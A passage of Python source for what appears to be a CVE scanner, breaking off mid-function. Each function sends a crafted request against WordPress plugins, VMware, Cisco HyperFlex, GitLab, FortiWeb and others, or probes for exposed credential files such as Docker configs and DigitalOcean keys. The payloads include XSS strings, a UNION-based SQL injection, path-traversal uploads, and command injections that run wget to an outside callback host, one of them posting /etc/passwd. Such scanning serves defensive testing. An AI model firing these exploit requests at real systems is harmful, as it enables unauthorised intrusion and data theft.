  urlList = ['/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//']
  redirAllow = False
  statusF = 200
  textF = 'onmouseover=alert(document.domain)//'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text and 'wp-content/uploads/photo-gallery' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24288
def CVE71(progScope):
  myKey = "bc36d4971d65f1bae1eb3e4d0d3411bc"
  vulnCat = "Open Redirect"
  vulnName = "CVE71"
  severity = "P3"
  vulnDsc = "AcyMailing < 7.5.0 - Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://example.com&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym']
  redirAllow = False
  statusF = 301
  textF = 'https://example.com'
  condition = lambda z : True if((z.status_code == statusF or z.status_code == 302 ) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24285
def CVE72(progScope):
  myKey = "a98c569fddf4f2cd13f7bdd9357f3e7f"
  vulnCat = "SQLi"
  vulnName = "CVE72"
  severity = "P1"
  vulnDsc = "Car Seller - Auto Classifieds Script WordPress plugin SQLI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
  reqMethod = "POST"
  postData = """action=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -"""
  urlList = ['/wp-admin/admin-ajax.php']
  redirAllow = False
  statusF = 200
  textF = 'qzvvqhWAAlCfTiMDmAoqzkTpJEzPwVFSaIpfAfdfTinrMqqxkq'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24276
def CVE73(progScope):
  myKey = "06968aea434149936823227d7294608a"
  vulnCat = "RXSS"
  vulnName = "CVE73"
  severity = "P3"
  vulnDsc = "Contact Form by Supsystic < 1.7.15 - Reflected Cross-Site scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin.php?page=contact-form-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24275
def CVE74(progScope):
  myKey = "23628e435859645258e48251b735d5f7"
  vulnCat = "RXSS"
  vulnName = "CVE74"
  severity = "P3"
  vulnDsc = "Popup by Supsystic < 1.10.5 - Reflected Cross-Site scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin.php?page=popup-wp-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24274
def CVE75(progScope):
  myKey = "f4f245d344ba03a19aaefc44415e197f"
  vulnCat = "RXSS"
  vulnName = "CVE-2021-24274"
  severity = "P3"
  vulnDsc = "Ultimate Maps by Supsystic < 1.2.5 - Reflected Cross-Site scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin.php?page=ultimate-maps-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24237
def CVE76(progScope):
  myKey = "4396eab6c6d452988eb427d3315f1ead"
  vulnCat = "RXSS"
  vulnName = "CVE76"
  severity = "P3"
  vulnDsc = "Realteo WordPress Plugin <= 1.2.3 - Unauthenticated Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/properties/?keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/iput/)%3B%2F%2F']
  redirAllow = False
  statusF = 200
  textF = 'autofocus onfocus=alert(/iput/);//'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24235
def CVE77(progScope):
  myKey = "bf1514ebc3ab6fbba711ce7463b2111a"
  vulnCat = "RXSS"
  vulnName = "CVE77"
  severity = "P3"
  vulnDsc = "Goto - Tour & Travel < 2.0 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13']
  redirAllow = False
  statusF = 200
  textF = 'input/Autofocus/%0D*/Onfocus=alert(123);'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24226
def CVE78(progScope):
  myKey = "a24d3022617082178a0b349f6112921b"
  vulnCat = "Auth Bypass"
  vulnName = "CVE78"
  severity = "P1"
  vulnDsc = "AccessAlly < 3.5.7 - $_SERVER Superglobal Leakage"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = '<div id="accessally-testing-data"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24210
def CVE79(progScope):
  myKey = "6c8c5629bd8143b29ab8c27cb38cf664"
  vulnCat = "Open Redirect"
  vulnName = "CVE79"
  severity = "P3"
  vulnDsc = "PhastPress < 1.111 - Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Fexample.com']
  redirAllow = False
  statusF = 301
  textF = 'https://example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 302 ) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24176
def CVE80(progScope):
  myKey = "adbdff584bbd769210d4a88bb0243a79"
  vulnCat = "RXSS"
  vulnName = "CVE80"
  severity = "P3"
  vulnDsc = "WordPress JH 404 Logger XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/jh-404-logger/readme.txt']
  redirAllow = False
  statusF = 200
  textF = 'JH 404 Logger'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24146
def CVE81(progScope):
  myKey = "a6dc4866bede9befa90fa0b7901df9d0"
  vulnCat = "Unauth Access"
  vulnName = "CVE81"
  severity = "P1"
  vulnDsc = "Modern Events Calendar Lite < 5.16.5 - Unauthenticated Events Export"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv']
  redirAllow = False
  statusF = 200
  textF = 'Organizer Tel'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-22986
# def CVE82(progScope):
  # myKey = "2fa76c474c1c03a3f7e8804a49c7cc5f"
  # vulnCat = "RCE"
  # vulnName = "CVE82"
  # severity = "P1"
  # vulnDsc = "F5 BIG-IP iControl REST unauthenticated RCE"
  # vulnPath = ""
  # fullPayload = ""
  # customHeaders = {'Accept-Language': 'en'
  #       ,'Authorization': 'Basic YWRtaW46'
  #       ,'Content-Type': 'application/json'
  #       ,'Cookie': 'BIGIPAuthCookie=1234'
  #       ,'Connection': 'close'}
  # reqMethod = "POST"
  # postData = """{"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}"""
  # urlList = ['/mgmt/tm/util/bash']
  # redirAllow = False
  # statusF = 200
  # textF = 'token'
  # condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  # targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  

# CVE-2021-22214
def CVE83(progScope):
  myKey = "b118bad0f8a0ec8962f5d9095399d748"
  vulnCat = "SSRF"
  vulnName = "CVE83"
  severity = "P2"
  vulnDsc = "Unauthenticated Gitlab SSRF - CI Lint API"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'content-type': 'application/json'}
  reqMethod = "POST"
  postData = """{"content": "include:\n  remote: http://0000nlm6c0j53v2s668g61398133715me.interact.sh//api/v1/targets?test.yml"}"""
  urlList = ['/api/v4/ci/lint?include_merged_yaml=true']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-22145
def CVE84(progScope):
  myKey = "7099a8372049320b0815986a14f562ea"
  vulnCat = "Memory disclosure"
  vulnName = "CVE-2021-22145"
  severity = "P3"
  vulnDsc = "ElasticSearch 7.13.3 - Memory disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/json'}
  reqMethod = ""
  postData = ""
  urlList = ['/_bulk']
  redirAllow = False
  statusF = 200
  textF = 'root_cause'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-22122
def CVE85(progScope):
  myKey = "49aaed622bc1337327ac3a6afe0426e3"
  vulnCat = "RXSS"
  vulnName = "CVE85"
  severity = "P3"
  vulnDsc = "FortiWeb v6.3.x-6.2.x Unauthenticated XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/error3?msg=30&data=\';alert(\'nuclei\');//','/omni_success?cmdb_edit_path=\");alert(\'nuclei\');//']
  redirAllow = False
  statusF = 200
  textF = 'No policy has been chosen.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'nuclei' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-22005
def CVE86(progScope):
  myKey = "52e90fd338947c003b1191aa33f0eb26"
  vulnCat = "File Upload"
  vulnName = "CVE86"
  severity = "P1"
  vulnDsc = "VMware vCenter Server file upload vulnerability"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/json'}
  reqMethod = "POST"
  postData = """test_data"""
  urlList = ['/analytics/telemetry/ph/api/hyper/send?_c&_i=test']
  redirAllow = False
  statusF = 201
  textF = ''
  condition = lambda z : True if( (z.status_code == statusF) and (len(z.text) == 0 )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21985
def CVE87(progScope):
  myKey = "a1da58b577a3ec122eac85b62c44fb0a"
  vulnCat = "RCE"
  vulnName = "CVE87"
  severity = "P1"
  vulnDsc = "VMware vSphere Client (HTML5) RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': '*/*'
        ,'Content-Type': 'application/json'}
  reqMethod = "POST"
  postData = """{"methodInput":[{"type":"ClusterComputeResource","value": null,"serverGuid": null}]}"""
  urlList = ['/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData']
  redirAllow = False
  statusF = 200
  textF = '{"result":{"isDisconnected":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21978
def CVE88(progScope):
  myKey = "d4b01bdc51ca65545ebbca8ca4901deb"
  vulnCat = "RCE"
  vulnName = "CVE88"
  severity = "P1"
  vulnDsc = "VMware View Planner Unauthenticated RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS'
        ,'Accept': 'text/html'
        ,'Connection': 'close'}
  reqMethod = "POST"
  postData = """------WebKitFormBoundarySHHbUsfCoxlX1bpS
        Content-Disposition: form-data; name="logfile"; filename=""
        Content-Type: text/plain
        POC_TEST
        ------WebKitFormBoundarySHHbUsfCoxlX1bpS"""
  urlList = ['/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D']
  redirAllow = False
  statusF = 200
  textF = 'File uploaded successfully.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21972
def CVE89(progScope):
  myKey = "9fa390c966ec7fbc3bfc9298050dd0d6"
  vulnCat = "RCE"
  vulnName = "CVE89"
  severity = "P1"
  vulnDsc = "VMware vCenter Unauthenticated RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ui/vropspluginui/rest/services/getstatus']
  redirAllow = False
  statusF = 200
  textF = 'Install Final Progress'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'Config Final Progress' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21803
def CVE90(progScope):
  myKey = "202d0dab00b187e0b9bae4ef5d86cd97"
  vulnCat = "RXSSS"
  vulnName = "CVE90"
  severity = "P3"
  vulnDsc = "Advantech R-SeeNet is2sim parameter - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22']
  redirAllow = False
  statusF = 200
  textF = '"zlo onerror=alert(1) "'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21802
def CVE91(progScope):
  myKey = "c300739cc22b79b6e36382cc28eb62c8"
  vulnCat = "RXSS"
  vulnName = "CVE91"
  severity = "P3"
  vulnDsc = "Advantech R-SeeNet device_id parameter - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22']
  redirAllow = False
  statusF = 200
  textF = '"zlo onerror=alert(1) "'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21801
def CVE92(progScope):
  myKey = "0e939323936568accfae714f516005d4"
  vulnCat = "RXSS"
  vulnName = "CVE92"
  severity = "P3"
  vulnDsc = "Advantech R-SeeNet graph parameter - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22']
  redirAllow = False
  statusF = 200
  textF = '"zlo onerror=alert(1) "'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21389
def CVE93(progScope):
  myKey = "ea937f0edb6f0bf9015b7376529448b6"
  vulnCat = "RCE"
  vulnName = "CVE93"
  severity = "P2"
  vulnDsc = "BuddyPress REST API Privilege Escalation to RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/json; charset=UTF-8'}
  reqMethod = "POST"
  postData = """{
          "user_login":"iput",
          "password":"iput",
          "user_name":"iput",
          "user_email":"iput@example.com"
        }"""
  urlList = ['/wp-json/buddypress/v1/signup']
  redirAllow = False
  statusF = 200
  textF = 'user_login'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'activation_key' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-21315
def CVE94(progScope):
  myKey = "29b2738244c55c47a61056114ea72bba"
  vulnCat = "RCE"
  vulnName = "CVE94"
  severity = "P2"
  vulnDsc = "Node.js Systeminformation Command Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)']
  redirAllow = False
  statusF = 200
  textF = 'wget --post-file /etc/passwd burpcollaborator.net'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'name' in z.text and 'running' in z.text and 'pids' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-20114 
def CVE95(progScope):
  myKey = "8efbb11ed8d4bf89445c63a11af7957f"
  vulnCat = "Info Disclo"
  vulnName = "CVE95"
  severity = "P2"
  vulnDsc = "TCExam <= 14.8.1 Exposure of Sensitive Information to an Unauthorized Actor"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/cache/backup/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /cache/backup'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-1499
def CVE96(progScope):
  myKey = "e003a3a7329924efe162e0eaa2c84fc0"
  vulnCat = "FileUpload"
  vulnName = "CVE96"
  severity = "P3"
  vulnDsc = "Cisco HyperFlex HX Data Platform - File Upload Vulnerability"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': '*/*'
        ,'Accept-Encoding': 'gzip, deflate'
        ,'Content-Type': 'multipart/form-data; boundary=---------------------------253855577425106594691130420583'}
  reqMethod = "POST"
  postData = """----------------------------253855577425106594691130420583
        Content-Disposition: form-data; name="file"; filename="../../../../../tmp/passwd9"
        Content-Type: application/json
        MyPasswdNewData->/api/tomcat
        -----------------------------253855577425106594691130420583--"""
  urlList = ['/upload']
  redirAllow = False
  statusF = 200
  textF = '/tmp/passwd9'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '{"result":' in z.text and '"filename:' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-1498
def CVE97(progScope):
  myKey = "bfc170409a8b759435f1dad2877c5a30"
  vulnCat = "RCE"
  vulnName = "CVE97"
  severity = "P1"
  vulnDsc = "Cisco HyperFlex HX Data Platform RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = "POST"
  postData = """action=&token=`wget http://0000nlm6c0j53v2s668g61398133715me.interact.sh/`&mode=`wget http://0000nlm6c0j53v2s668g61398133715me.interact.sh/`"""
  urlList = ['/storfs-asup']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-1497
def CVE98(progScope):
  myKey = "9f8a6e7e0683f7b4df565b6482a8428b"
  vulnCat = "RCE"
  vulnName = "CVE98"
  severity = "P1"
  vulnDsc = "Cisco HyperFlex HX Data Platform RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': '*/*'
        ,'Content-Type': 'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """username=root&password={{url_encode('123","$6$$"));import os;os.system("wget http://0000nlm6c0j53v2s668g61398133715me.interact.sh/");print(crypt.crypt("')}}"""
  urlList = ['/auth/change']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# axiom-digitalocean-key-exposure
def attMOD0(progScope):
  myKey = "2cf095a77ec84f001e4c71eab371ca02"
  vulnCat = "Exposure"
  vulnName = "Expo0"
  severity = "P1"
  vulnDsc = "DigitalOcean key exposure via Axiom"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.axiom/accounts/do.json']
  redirAllow = False
  statusF = 200
  textF = '"do_key"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# tugboat-config-exposure
def attMOD1(progScope):
  myKey = "49923dcfbeb74f8d47bad9977c3f0f1d"
  vulnCat = "Exposure"
  vulnName = "Expo1"
  severity = "P1"
  vulnDsc = "Tugboat configuration file exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.tugboat']
  redirAllow = False
  statusF = 200
  textF = 'ssh_user'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# dockercfg-config
def attMOD2(progScope):
  myKey = "9d7211bfa3540c604d02da82162db61f"
  vulnCat = "Exposure"
  vulnName = "Expo2"
  severity = "P2"
  vulnDsc = "Docker registry authentication data"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.dockercfg','/.docker/config.json']
  redirAllow = False
  statusF = 200
  textF = '"auth":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"email":' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# access-log-file
def attMOD3(progScope):
  myKey = "9875949b3f99ec91f3fdf2d8fe597b59"
  vulnCat = "Exposure"
  vulnName = "Expo3"
  severity = "P4"
  vulnDsc = "Publicly accessible access-log file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/access.log','/log/access.log','/logs/access.log','/application/logs/access.log']
  redirAllow = False
  statusF = 200
  textF = '"GET /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# darkstat-detect
def attMOD4(progScope):
  myKey = "e57ac979843eb1adf09c401705e405c5"
  vulnCat = "Exposure"
  vulnName = "Expo4"
  severity = "P2"
  vulnDsc = "Detect Darkstat Reports"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/darkstat/']
  redirAllow = False
  statusF = 200
  textF = '<title>Graphs'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# development-logs 
def attMOD5(progScope):
  myKey = "d38a68c31d9671abfcac96d722e73e0a"
  vulnCat = "Exposure"
  vulnName = "Expo5"
  severity = "P4"
  vulnDsc = "Discover development log files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/log/development.log','/logs/development.log','/development.log']
  redirAllow = False
  statusF = 200
  textF = 'Connecting to database specified by database.yml'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# django-debug-exposure
def attMOD6(progScope):
  myKey = "144fadaf59dbc3160bf6728f331364f3"
  vulnCat = "django-debug-exposure"
  vulnName = "Expo6"
  severity = "P2"
  vulnDsc = "Django Debug Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/admin/login/?next=/admin/']
  redirAllow = False
  statusF = 200
  textF = 'ADMIN_PASSWORD'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_HOST' in z.text and 'DB_NAME' in z.text and 'DJANGO' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# elmah-log-file
def attMOD7(progScope):
  myKey = "95d1bb1ec70714f0e796956f24a465b8"
  vulnCat = "Exposure"
  vulnName = "Expo7"
  severity = "P3"
  vulnDsc = "elmah.axd Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/elmah.axd']
  redirAllow = False
  statusF = 200
  textF = 'Error Log for'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# error-logs
def attMOD8(progScope):
  myKey = "8e42e9c91f174389df7eeb8eaedec8d3"
  vulnCat = "Exposure"
  vulnName = "Expo8"
  severity = "P4"
